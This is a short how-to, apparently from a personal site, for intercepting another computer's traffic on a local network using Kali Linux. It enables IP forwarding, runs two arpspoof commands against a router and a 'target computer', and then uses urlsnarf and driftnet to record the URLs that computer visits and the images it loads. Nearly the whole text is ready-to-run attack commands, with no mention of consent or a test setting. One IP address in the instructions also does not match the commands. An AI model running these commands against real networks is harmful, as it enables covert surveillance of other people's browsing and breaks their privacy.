Boot / Install Kali

If on virtualbox, you will need a USB wifi stick. Once added, click the usb icon in the bottom right and add the device to your guest OS
![](http://teachthe.net/topclipbox/2016-05-03_22-29-253QLRLY.png)

NOTE - Your network should be in Bridged Adapter mode.


First, we run this so any traffic we intercept is still forwarded on to the internet.
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Next we run this:
```shell
airmon-ng
```

You should see something like this
![](http://teachthe.net/topclipbox/2016-05-03_22-31-4102HNZ4.png)

From the above, get your Interface name and use it below in place of 'wlan0'

Next we have these two commands to capture traffic from the router->computer, and then computer->router
```
arpspoof -i wlan0 -t 192.168.0.1 192.168.0.105
arpspoof -i wlan0 -t 192.168.0.105 192.168.0.1
```
Several changes need to be made to these commands.

1) Replace wlan0 with your interface name.

2) Replace 192.168.0.1 with your router IP

3) Replace 192.168.1.105 with our target computer IP

Troubleshooting - if you get error "couldn't arp for host", try disconnecting your wired connection in kali, and using your usb wireless card to connect to the wireless network. Ensure your virtualbox is set to Bridged Adapter mode, and then try pinging the IPs (both router and target)

What next?

To track URLs the target computer is visiting:
```
urlsnarf -i wlan0
```

To track images:
```
driftnet -i wlan0
```
